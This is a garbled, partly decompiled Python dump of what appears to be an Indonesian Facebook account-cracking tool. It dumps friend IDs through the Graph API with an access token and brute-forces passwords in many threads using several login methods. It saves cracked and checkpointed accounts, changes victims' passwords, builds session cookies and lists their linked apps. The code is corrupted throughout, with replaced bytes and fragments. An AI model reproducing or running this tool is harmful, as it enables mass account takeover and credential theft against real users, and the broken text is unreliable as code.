dttttf ? t?d? t?  ntdd??|? | dkrctdd??d? d S | dkrqtdd??d? d S tdd??d? d S |dv r?tdd??d? 	 d S tdttttf ? t?  d S )NTu4   %s [%s•%s] %sCHANGE ONE TAP ACCOUNT PASS? [Y/n] : r?   r?   ?r   rH   r?   r?   r.   r  r?   r  u(   %s [%s•%s] %sENTER ONE TAP PASSWORD : r?  z%%s [%s!%s] %sSandi Minimal 6 Karakterr?  ?_new_pass_.txtr  r  )r#   rI   r?   r2   r?   )r?   r*   rz   r?   rj   r5   r?   r  rc   r  rt   re   rf   )Z_piye_Z_gimana_Z	_newpass_rZ   rZ   r[   ?auto_ganti_passH  s$   "?$2???r  c                 C   s?  dt  }z	tdd??? }W n   d}Y d?|?}dttt| |t| ?tf }g d?}|d?D ]}	|	?d	?|v rDt?	|	?d	?|	?d
?i? q.|j
t|?d? td?j}
t|
d?}|?dddi?}g d?}dt?dt|
??v r?|d?D ]}|?d	?|v r?t?	|?d	?|?d
?i? qqt?	d|i? |j
t|?d? td?}d?dd? |j?? ?? D ??}t|?}t||? t?d| |f ? t|d??d| |f ? td8 ad S 	 d S )N?	OK/%s.txtr  rv   z	azimvau-_r   r	  )zsubmit[Yes]r  r?  r  r  r  r?   r?  r  rw  r  r  r   rz  )zsubmit[Next]r  r?  r  zCreate a new passwordr
  Zpassword_newr?  c                 S   r?  r?  rZ   r?  rZ   rZ   r[   r?  c  r?  zchange_pass.<locals>.<listcomp>?   %s•%sr   r!  r	   )?tanggalr  ry   r'  r*   rz   r  r	  ?data_change_1r?  rz  r  r?   r%  r\  r?   r)  rE  ?data_change_2r  r?  r?  r  r  r?  r   rx   rc   r?  )r  r,  r  r  ?files_okZ
_new_pass_Z
_password_r  Z_button_dev_r?   Z_ganti_pass_Z_result_pass_Z_link_3_Z_button_dev__2_r?   Z_ses_final_r?  Z__cookies__rZ   rZ   r[   r  W  s   ,(?<(??r  c                 C   s2  g }t ?? }tdd??? }d}|j|d|id?}t|jd?}|jddd	?}|?d
?D ]}	z|	?d?j	}
|?
d|
 ? W q*   Y q*d}|j|d|id?}t|jd?}|jddd	?}|?d
?D ]}	z|	?d?j	}
|?
d|
 ? W q^   Y q^|dkr?t| d?|? ? td? d S |dkr?t| d?|? ? d S d S )Nr  rv   z<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer?   r  r  r  rz  )r   r:  rx  u   
   • z>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactiver  r   r  )r?   r$  r  ry   r	  r%  r[  r\  r&  r?   r   rt   r'  )?h_okr?   ?apkrV  r  r+  Zdat_gameZdatagameZform_ZasuZcelengZurl2rZ   rZ   r[   r  g  s   0 
0 
&"r  c                 C   s
  t ?dt| ??rd}|S t| ?dkr?| d d? dv rd}|S | d d? dv r*d}|S | d d	? d
v r6d}|S | d d? dv rBd}|S | d d? dv rNd}|S | d d? dv rZd}|S | d d? dv rfd}|S | d d? dv rrd}|S | d d? dv r~d}|S | d d? dv r?d}|S | d d? dv r?d}|S | d d? dv r?d}|S | d d? dv r?d }|S | d d? d!v r?d"}|S | d d? d#v r?d$}|S | d d? d%v r?d&}|S | d d? d'v r?d(}|S d}|S t| ?d)v r?d*}|S t| ?d	kr?d+}|S t| ?dk?rd,}|S d}|S )-Nz[a-zA-Z]r   ?   ?
   )Z
1000000000u	    • 2009?	   )Z	100000000?   )Z10000000?   )Z1000000Z1000001Z1000002Z1000003Z1000004Z1000005)Z1000006Z1000007Z1000008Z1000009u	    • 2010r?  )Z100001u    • 2010/2011)Z100002Z100003u    • 2011/2012)Z100004u    • 2012/2013)Z100005Z100006u    • 2013/2014)Z100007Z100008u    • 2014/2015)Z100009u	    • 2015r?  )Z10001u    • 2015/2016)Z10002u    • 2016/2017)Z10003u    • 2018/2019)Z10004u    • 2019/2020)Z10005u	    • 2020)Z10006Z10007Z10008u	    • 2021)r)  r(  u    • 2008/2009u    • 2007/2008u    • 2006/2007)r?   r)  rE  r  )ZfxZtahunzrZ   rZ   r[   r  v  s^   ?????????????
?	????????r  c                 C   st   i }| ? dd??d?}|D ]}|?d?d }|?d?d }|?||i? qd|d |d	 |d
 |d |d f }|S )Nr?   r   r?  r1   r   r	   z'sb=%s; datr=%s; c_user=%s; xs=%s; fr=%sZsbZdatrr?  Zxs?fr)r?   r>  r?  )Zraw_cookiesr?   Zkikor?   r?   rh   Zcooked_cookiesrZ   rZ   r[   r  ?  s   &r  c                  C   sl  zt ?d? W n   Y 	 t?  tdttttf ?} | dv r.tdd?}|?d? |?	?  d S | dv rBtdd?}|?d? |?	?  d S | d	v rVtdd?}|?d
? |?	?  d S | dv rjtdd?}|?d? |?	?  d S | dv r~tdd?}|?d? |?	?  d S | dv r?tdd?}|?d? |?	?  d S | dv r?tdd?}|?d? |?	?  d S tdd?}|?d? |?	?  d S )N?
method.txtTr?   r?  r?   ?methode_mbasic_v1r?   ?methode_api_v1r?   ?methode_api_v2r?   r?   ?methode_mbasic_v2r?   ?methode_mobile_v1r?   ?methode_mobile_v2)
rX   rY   ?start_methodr?   r*   rz   r?   r  rc   r?   )Zput?cokrZ   rZ   r[   ?pilih_methode?  s*   $$?$?$?$?$?$??r6  c                   @   s$   e Zd Zdd? Zdd? Zdd? ZdS )r  c           	      C   s?  t | _t| _d| _d| _t| j?dkrnzt?|? W n   td? Y zt?d? W n   Y t	dd?}|?
d? |??  	 t?  td	t ? td
tttttttttf	 ? tdttttf ?}|dkrttdttttf ? t?  ?nT|dv r?zH	 z|| _t| j??? ?? | _W n ty? } ztd| ? W Y d }~qyd }~ww g | _| jD ]}z| j?d|?d?d i? W q?   Y q?W n ty? } ztd| ? W Y d }~q>d }~ww tdtttttf ? | ??  d S |dv ?rȐz?	 z|| _t| j??? ?? | _W n t?y } ztd| ? W Y d }~q?d }~ww g | _t?  tdttttf ?}|dv ?r>tdttttf ? t?  n?|dv ?rh| jD ] }z| j?|?d?d t |?d?d ?d?? W ?qF   Y ?qFn?|dv ?r?| jD ] }z| j?|?d?d t!|?d?d ?d?? W ?qp   Y ?qpn|dv ?r?| jD ] }z| j?|?d?d t"|?d?d ?d?? W ?q?   Y ?q?nU|dv ?rzt?d? W n   Y zt?d? W n   Y t#?  t$?  | jD ] }z| j?|?d?d t%|?d?d ?d?? W ?q?   Y ?q?ntdttttf ? t?  zt?d? W n   Y td	t ? tdttttf ?}|dv ?r@tdttttf ? t?  nm|dv ?rpt&d ? t	dd?}|?
d!? |??  t'?  t(d"??)| j*| j? t?| j? t+?  W d S |d#v ?r?t&d$? t	dd?}|?
d? |??  t'?  t(d"??)| j*| j? t?| j? t+?  W d S tdttttf ? t?  W n t?y? } ztd| ? W Y d }~nd }~ww q?)%Nr   r?  r?  ZFUCKr  r?   rw   Tr}   uC   %s [%s•%s] %sCRACK WITH DEFAULT / MANUAL PASSWORD %s[%sd%s/%sm%s]r?   r   r?   )r?   r5   r#   rI   r?   z   %sr?   r?   u1   %s [%s•%s] %sEXAMPLE : %sNIGERIAN,123456,778899)r?   r4   r   rH   r?   r?   r?   r	   )r?   r  r?   r?   r?   r?  r?  ?cp_option.txtu,   %s [%s•%s] %sBRING UP CP OPTIONS? [Y/n] : r  r  ?opsi_cp?#   ?r#   rI   r?   r?   r2   r  ),r?  ?adar?  ?koZ_hayo_mau_recode_r  rX   rY   rt   r  rc   r?   r6  r?   r*   rz   r&   r?   rj   r5   r?   r&  rx   ry   r  Zfsr  rR  r   r>  ?pwlist?start_methodezzr?  r?  r?  r?  r?  r?  r  ?started?
ThreadPool?map?start_crackr{   )	rI  r?  ?cikZ_pilih_sandi_ri   r?   Zkopi?pufr5  rZ   rZ   r[   rJ  ?  s?   0& &? 
 
?&? "
 (?  


2?

2?

2?

2? &``?(? ?zcrack.__init__c                 C   s?  t dttttf ??d?| _t| j?dkr| ??  d S | jD ]
}|?	d| ji? qzt
?d? W n   Y tdt ? t dttttf ?}|dv rXtd	ttttf ? t?  d S |d
v r?td? tdd?}|?d? |??  t?  td??| j| j? t
?| j? t?  d S |dv r?td? tdd?}|?d? |??  t?  td??| j| j? t
?| j? t?  d S td	ttttf ? t?  d S )Nu    %s [%s•%s] %sENTER PASSWORD : r}  r   r  r7  r}   u*   %s [%s•%s] %sPOP UP CP OPTIONS? [Y/n] : r?   r?   r  r  r?   r8  ?   r:  r  rw   )r?   r?   rz   r*   r>  r  r  r=  rR  r?  rX   rY   rt   r?   rj   r5   r?   r  r  rc   r?   r?  r@  rA  rB  r&  r{   )rI  r?   rD  r5  rZ   rZ   r[   r=  ?  s    &\\zcrack.pwlistc                 C   sL  ?z?t dd??? }|?d?D ?]\}d|v rt|?d?|?}nId|v r+t|?d?|?}n<d|v r8t|?d?|?}n/d|v rEt|?d?|?}n"d	|v rRt|?d?|?}nd
|v r_t|?d?|?}nt|?d?|?}|?d?dkr?dt	 }|?d?|v rzqz0t
d|?d? d tdd???  ?}t|j?}|d }|?d?\}	}
}t|	 }	d|
|	|f }W n   dd }Y dttt|?d?||t|?d??f }t|?d?||? | j?d|?d?|f ? t|d??d|?d?||?dd?f ?  nz|?d?dk?rkdt	 }|?d?|v ?rqd|v ?sd|v ?sd	|v ?sd
|v ?r9dttt|?d?|t|?d??tf }t|t|?d??? ntdttt|?d?|t|?d??f ? | j?d|?d?|f ? t|d??d |?d?|f ?  nq|  jd!7  _td"tttt| jt| j?ttt| j?ttt| j?ttf dd#? t j!?"?  W d S    | ?#|? Y d S )$Nr-  rv   r  r/  r?   r0  r.  r1  r2  r3  r?  r?  z	CP/%s.txtr?   zf?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=rV   Zbirthdayr  u    • %s %s %sr   rZ   u*    %s[%sAlien-CP%s] %s • %s%s%s          r   r   u
   %s•%s%s
r?   r?  r  r	  r  u(    %s[%sAlien-OK%s] %s • %s%s          r!  r	   z> %s[%sCRACK%s][%s%s/%s%s][%sAlien-OK:%s%s][%sAlien-CP:%s%s]%sr  )$r  ry   r	  r?  r?  r?  r?  r   r  r!  r?   rx   r?   r?   r>  ?	bulan_ttlr?   rz   r  r  r?  r   rc   r?   r*   r  r  rt   r;  r<  r  rR  ra   rb   rd   rB  )rI  rR  Zmetoder?   ?logZfiles_cpZke?tt?ttlr?   r?   r?   ZttllZh_cpr$  r%  rZ   rZ   r[   rB    s6   b8Fd(<Pzcrack.start_crackN)rt  ru  rv  rJ  r=  rB  rZ   rZ   rZ   r[   r  ?  s    Ar  c               	   C   s?  t dtttttf ?} z#tdd??? }td| |f ?}t|j?}t	dtttt
|d f ? W n ttfyF   tdttttf ? t?  Y nw g }g }t dtttttf ?}t	d	ttf ? td
| ||f ?}t|j?}|d D ]	}	|?|	d ? qp|D ]K}
z:td|
|f ?}t|j?}z|d D ]	}|?|d ? q?W n ty?   t	d? Y nw t	d|
dt|?? |??  W q| ty?   t	dt ? Y q|w t	d? t d? t?  d S )Nu   %s [%s•%s] %sTARGET ID :%s rV   rv   z-https://graph.facebook.com/%s?access_token=%sr?   r?   r?   u   %s [%s•%s] %sDUMP LIMIT : %sz%s %sz>https://graph.facebook.com/%s/friends?limit=%s&access_token=%sr?   r?   z5https://graph.facebook.com/%s/friends?access_token=%sz [!] PRIVATEu    [•]r?   z%s [!] SPAM ACCOUNT...!r?   z	 [ BACK ])r?   r*   rz   r?   rx   ry   r?   r?   r?   rt   r?   r?   r?   rj   r5   r?   r   r  rn   r?   )r  r?   ?mmZnnrH  ?teZlimr;  Zidir?   r?   Zada2Zidi2r?   rZ   rZ   r[   r?   #  s   H0J r?   c            	   	   C   s?  t ?  t?  tdtttf ? tdt ? tdttttf ? tdttttf ? tdttttf ?} | dv rFtdttttf ? t	?  ?nq| dv r?z?t
?d	?}tdt ? td
tttf ? tdt ? |D ]}tdtttt|f ? qgtdt ? tdttttf ?}td? |dkr?tdttttf ? t?  z;td| ??? ?? }|D ]}|?dd?}tdttt|f ? q?d| ?dd??dd?}tdtttt|t|?f ? W n   tdtttf ? Y W n? ttfy?   tdtttf ? Y n?w | dv ?r?z?t
?d?}tdt ? tdtttf ? tdt ? |D ]}tdtttt|f ? ?qtdt ? tdttttf ?}td? |dk?rPtdttttf ? t?  z<td| ??? ?? }|D ]}|?dd?}tdttt|f ? ?q]d| ?dd??dd?}tdtttt|t|?f ? W n   tdtttf ? Y W n   tdtttf ? Y ntdttttf ? t	?  tdt ? tdttttf ? t	?  d S )Nz%s [ %sCRACK RESULTS %s]r}   z%s [%s1%s] %sCHECK RESULTS OKz%s [%s2%s] %sCHECK RESULTS CPr?   r?   r?   r?   ZOKz*%s [%s CRACK RESULTS STORED IN OK FILE %s]u   %s [%s•%s] %s%su!   %s [%s•%s] %sENTER FILE NAME : r   zOK/%sr?   ?    • z %s[%sAlien-OK%s] %srj  r?  r?   z.txtu8   
%s [%s•%s] %sTOTAL CRACK RESULT DATE %s IS %s ACCOUNTz%s [%s NO RESULTS FOUND %s]r?   ?Alien-CPz+%s [%s CRACK RESULTS STORED IN CP FILES %s]zAlien-CP/%sz %s[%sAlien-CP%s] %sr?   )rn   ru   rj   r*   rz   rt   r?   r?   r5   r?   rX   ?listdirr?   rx   ry   r  r?   r  r?   r?   )	ZchZoklr?   r?  Zpppr?   ZyyyZdel1ZcplrZ   rZ   r[   r?   4  s@   Z&4 ("*8?(
4"($,8?*r?   c               
   C   s?  zt ?d? W n   Y tdd?} | ?d? | ??  tdtttf ? tdt ? tdttttt	f ? t
dttttf ?}d| }zt|d	??? ?? }W n tyh   td
ttttf ? t?d? t?  Y nw td? tdttttttt|??f ? td? |D ]0}d|v r?|?dd?}|?dd?}|?d?}dttt|f }zt|d |d |? W q?   Y q?td? tdttttf ? tdt ? t
dttttf ? t?  d S )Nr  r?   r?   z-%s [ %sCHECK CRACK RESULT ACCOUNT OPTIONS %s]r}   u$   %s [%s•%s] %sEXAMPLE FILE : %s.txtu   %s [%s•%s] %sFile : zCP/rv   r?  r/   r  u$   %s [%s•%s] %sTOTAL ACCOUNTS : %s%sr   u   â€¢r?   rL  z %s[%sAlien-CP%s] %s          r   r	   u(   %s [%s•%s] %sCHECKING PROCESS COMPLETEr?   )rX   rY   r  rc   r?   rt   r*   r?   rz   r!  r?   rx   ry   r  r?  r5   re   rf   r?   r  rE  r  r?   r>  r  )rC  Zfiles__r?  Z	buka_bajuZmemekZkontolZtitidZ_format_rZ   rZ   r[   r?   T  s   P60
Fr?   c                   C   sn   t dtttf ? t d? t dttttttf ? t dttttttf ? t dttttf ? t dt ? d S )Nz'%s          [ %sCHOOSE LOGIN METHOD %s]r   z2%s [%s1%s] %sLOGIN WITH TOKEN [%sLIMITED ACCESS%s]z6%s [%s2%s] %sLOGIN WITH COOKIES [%sUNLIMITED ACCESS%s]z%s [%s0%s] %sEXITr}   )rt   r?   r?   r*   rz   r5   rZ   rZ   rZ   r[   r?   f  s   r?   c                	   C   s?   t dttttf ? t dtttttttf ? t dtttttttf ? t dttttf ? t dttttf ? t dttttf ? d S )Nz%s [%s1%s] %sGET USER AGENTz-%s [%s2%s] %sCHANGE USER AGENT %s(%sMANUAL%s)z0%s [%s3%s] %sCHANGE USER AGENT %s(%sADJUST HP%s)z%s [%s4%s] %sDELETE USER AGENTz%s [%s5%s] %sCHECK USER AGENTz%s [%s0%s] %sBACK)rt   r*   rz   r&   r?   r5   rZ   rZ   rZ   r[   r?   o  s   r?   c                   C   s?   t dt ? t dttttf ? t dttttf ? t dttttf ? t dttttf ? t dttttf ? t dttttf ? d S )Nr}   z%s [%s1%s] %sAPI METHOD V1z%s [%s2%s] %sAPI METHOD V2z%s [%s3%s] %sMBASIC METHOD V1z%s [%s4%s] %sMBASIC METHOD V2z%s [%s5%s] %sMOBILE METHOD V1z%s [%s6%s] %sMOBILE METHOD V2)rt   r?   r*   rz   rZ   rZ   rZ   r[   r4  w  s   r4  c                	   C   sv   t d? t dtttttttf ? t dtttttttf ? t dtttttttf ? t dttttf ? t d? d S )Nr   z+%s [%s1%s] %sFAST CLONE %s[%sFEW RESULTS%s]z+%s [%s2%s] %sSLOW CLONE %s[%sRECOMMENDED%s]z1%s [%s3%s] %sVERY SLOW CLONE %s[%sMORE RESULTS%s]z$%s [%s4%s] %sCOMBINED PASSWORD CLONE)rt   r*   rz   r?   r5   r&   rZ   rZ   rZ   r[   r>  ?  s   r>  c                   C   s?   t d? t dttttttttttttttttttf ? t dttttf ? t dttttttttf ? t dttttttttf ? tdttttf ? d S )Nr   u_        %s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•u%   %s [%s•%s] %sCLONING IN PROGRESS...u?   %s [%s•%s] %s[%sAlien-OK%s] IDS SAVED IN >> %sAlien-OK/%s.txtu?   %s [%s•%s] %s[%sAlien-CP%s] IDS SAVED IN >> %sAlien-CP/%s.txtu:   %s [%s•%s] %sON FLIGHT MODE FOR [3 SEC] EVERY 3 MINUTES
)	rt   r*   r5   r&   r?   rf  r!  rm   rz   rZ   rZ   rZ   r[   r?  ?  s   0r?  c                   C   rU   )NrM  zAlien-OK)rX   ?mkdirrZ   rZ   rZ   r[   ?folder?  r]   rP  ?__main__zgit pull)?r?   r(  ra   rX   r?  re   r?   r?   Zuuid?
subprocessrq   ?base64r   ?concurrent.futuresr   r@  r   r%  r   r   ?urllib.parser   r$  r,  r	  r?   rz  r   r
  r?   r  r?   r  rx   r?   r{   r?   rz   r5   r*   r?   r&   rf  r?   r2   r  r?  r?  rI  ?countr  r  r"  r#  Z	data_userr<  r'  r)  r?  r?  rE  rv   r?   ?rx?unameZplistZbasexr=  Zbasex1?	b64encodeZbasex2?decodeZbasex3r?   Zbase4Z	basesplitr?   Zrqr?   r?   rt   ?nowZ__sekarang__?yearZ	__tahun__?monthZ	__bulan__?dayZ__hari__rF  Z_list_bulan_Z_bulan_sekarang_?
ValueErrorZ_bulan_r!  r~   r?   r?   r?   r?   r?   r?   r?   r?   r?   r\   rj   rl   rm   rn   ru   r|   r?   r?   r?   r?   r?   r?   r?   r?   r?   r  r?   r4  r?   rA  r?   rs  r?   r  r?   r?   r?   r?  r?   r?  r?   r?  r?   r?  r?   r?  r?   r?  r?   r?  r?  r?  r?  r?  r?  r?  r?  r?  r?  r   r  r  r  r  r  r  r  r6  r  r?   r?   r?   r?   r?   r4  r>  r?  rP  rt  rs   rZ   rZ   rZ   r[   ?<module>   s0  `*<


l
?
??*	I( 		<8


$o 				


?